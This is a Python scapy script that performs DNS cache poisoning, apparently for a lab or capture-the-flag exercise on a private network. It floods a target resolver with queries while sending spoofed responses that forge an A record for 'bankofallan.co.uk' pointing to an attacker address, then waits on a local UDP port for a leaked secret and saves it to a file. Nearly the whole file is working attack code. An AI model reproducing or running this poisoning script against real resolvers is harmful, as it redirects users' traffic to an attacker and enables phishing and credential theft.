import os
os.sys.path.append('/usr/bin/')
# from scapy.layers.inet import  IP, sr1, UDP
from scapy.layers.dns import *
from scapy.all import sr1, send, sniff, Raw
import socket
import threading
import time
def launch_dns_listen_server(ip, port, buffer_size):
    udp_socket = socket.socket(family=socket.AF_INET, type=socket.SOCK_DGRAM)
    udp_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    udp_socket.bind((ip, port))
    return udp_socket
def launch_dns_attack(destination_ip, destination_port,query_name, is_finished):
    print("Starting query to DNS")
    while not is_finished[0]:
        #launch dns request
        dns_req = IP(dst=destination_ip)/UDP(dport=destination_port)/DNS(rd=1, qd=DNSQR(qname=query_name))
        send(dns_req)
        # answer = sr1(dns_req, verbose=0)
        # manage_answer(answer)
        # time.sleep(1)
def manage_answer(answer):
        # print(answer[DNS].show())
        return
def poison_cache(destination_ip, destination_port,bad_guy_ip,bad_guy_port, query_to_forger,is_finished):
        print("Starting poison attack...")
        while not is_finished[0]:
                # sniffed_packets=sniff(filter="port "+str(bad_guy_port),count=1,promisc=1)
                # for i in sniffed_packets:
                #         src = i[Raw].load
                        # print(src)
                        # print(i[UDP].show())
                        # string = '.'.join(str(ord(c)) for c in src)
                        # print(string)
                dns_resp = IP(dst=destination_ip, src=bad_guy_ip)/UDP(dport=destination_port,sport=bad_guy_port)/DNS(id=0,qd=DNSQR(qname=query_name),an=DNSRR(rrname=query_to_forger, type='A',rdata=bad_guy_ip, ttl=100))
                print("Sending corrupted response attack")
                send(dns_resp)
                # dns_req = IP(dst=destination_ip)/UDP(dport=destination_port)/DNS(rd=1, qd=DNSQR(qname=query_name)) 
                      
dns_to_attack_ip = "192.168.56.101"
bad_guy_ip = "192.168.56.1"
bad_guy_port = 55553
# print(dir(UDP))http://ricerca.wind.it/?missingurl=dnsrr.fields
local_ip = "127.0.0.1"
dns_to_attack_port = 53
udp_listen_port = 1337
buffer_size = 1024
query_name = "badguy.ru"
query_to_forger = "bankofallan.co.uk"

#variable to sync threads
is_finished = [False]
# Launching an asyncronous Thread performing DNS Cache Poisoning
attacker_thread = threading.Thread(target= launch_dns_attack, args=(dns_to_attack_ip, dns_to_attack_port,query_name, is_finished, ))
poisoner_thread = threading.Thread(target=poison_cache, args=(dns_to_attack_ip,dns_to_attack_port, bad_guy_ip,bad_guy_port,query_to_forger, is_finished ,))
# Launching UDP server in listen mode in order to receive the UDP packet
# containing the secret
udp_socket = launch_dns_listen_server(local_ip, udp_listen_port, buffer_size)

attacker_thread.start()
poisoner_thread.start()
bytePair = udp_socket.recvfrom(buffer_size)
is_finished[0] = True
#write result into a file
file_name = "udp_received.txt"
file = open(file_name, "w")
file.write(str(bytePair))
file.close()
print(bytePair)